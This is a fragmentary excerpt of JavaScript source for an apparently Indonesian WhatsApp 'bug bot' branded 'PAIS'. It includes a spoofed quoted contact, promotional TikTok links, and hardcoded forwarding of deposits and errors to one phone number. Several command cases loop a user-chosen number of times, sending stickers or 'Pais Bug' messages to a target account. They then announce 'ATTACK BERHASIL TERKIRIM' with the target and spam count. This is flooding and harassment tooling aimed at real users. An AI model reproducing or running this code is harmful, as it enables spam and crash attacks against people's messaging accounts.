...
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "tiktok.com/@pais_mc", 
"sourceUrl": "tiktok.com/@pais_mc" }}}, { quoted: m }) }
...
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Bot Bug ঔৣ⃕᭝PAIS 😈`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;HardzBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/3c485ff201d9337be14ef.jpg' }}}}
...
_I Am *𝗣𝗔𝗜𝗦* Recode By 𝗣𝗔𝗜𝗦 𝗠𝗼𝗱𝘀
...
zans.sendMessage('6283157565343@s.whatsapp.net', { text: `*ADA YANG DEPOSIT NIH*\n\n*@${sender.split('@')[0]}`, mentions: [sender]}, { quoted: m })
        }
        break
case 'domain':{
m.reply(Domain = `
...
case 'youtube':
	Biiofc.sendMessage(from, 
{text: `Jangan Lupa FOLOW TT Y
*Link* : tiktok.com/@pais_mc`},
{quoted: m})
        break
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "pais Bug🔥", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "pais Bug🔥", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
...
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(mnm, { text: "Pais Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(mnm, { text: "Pais Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${mnm.split("@")[0]}
...
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "Pais Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "YOUTUBE Pais🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×
...
console.log(e)
Biiofc.sendMessage("6283157565343@s.whatsapp.net", {text:`${util.format(e)}`})
}
}
